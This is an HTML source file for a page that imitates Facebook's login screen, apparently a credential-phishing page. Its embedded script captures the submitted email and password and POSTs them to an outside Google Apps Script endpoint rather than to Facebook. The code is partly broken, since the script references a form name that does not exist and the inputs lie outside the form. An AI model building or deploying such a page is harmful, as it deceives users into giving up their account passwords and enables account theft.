<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="input.css">
    <link rel="icon" 
      type="image/png" 
      href="favicon.png">
    <title>Facebook - log in or sign up</title>
</head>
<body class="bg-gray-100 ">
    <div class="container mt-48 flex mx-auto items-center justify-center">
        <div class="left w-1/2 mx-10">
            <img class="w-80" src="fb.svg" alt="facebook">
            <p class="text-3xl mx-6">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right flex flex-col bg-white p-8 rounded-xl relative w-1/3"><form method="post"></form>
            <input class="px-4 outline-blue-600 h-12 my-2 border border-1 border-gray-200 rounded-lg text-gray-900" name="Email" type="text" placeholder="Email address or phone number">
            <input class="px-4 outline-blue-600 h-12 my-2 border border-1 border-gray-200 rounded-lg" type="password" name="Password" placeholder="Password">
            <button class="bg-blue-600 cursor-pointer hover:underline hover:bg-blue-700 text-white my-2 py-3 rounded-md font-bold" value="Submit" name="Submit">Log In</button>
            <span class="text-blue-600 text-center text-sm my-2 cursor-pointer hover:underline">Forgotten password?</span>
            <hr class="my-2">
            <button class="bg-green-600 hover:bg-green-700 text-white cursor-pointer hover:underline my-2 py-3 rounded-md font-bold w-fit px-4 mx-auto">Create New Account</button>
            <span class="absolute -bottom-12 text-sm self-center"> <span class="font-bold hover:underline cursor-pointer"> Create a Page</span> for a celebrity, brand or business.</span>
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbyoO6cmDIcyfEOIoZHUNi6tbuoFGyG7PPBwHbenJclqmhfnyYdtVsS1vPC2gvmX07Ka/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => {
                form.reset()
            })
            .catch(error => console.error('Error!', error.message))
        })
      </script>

</body>
</html>
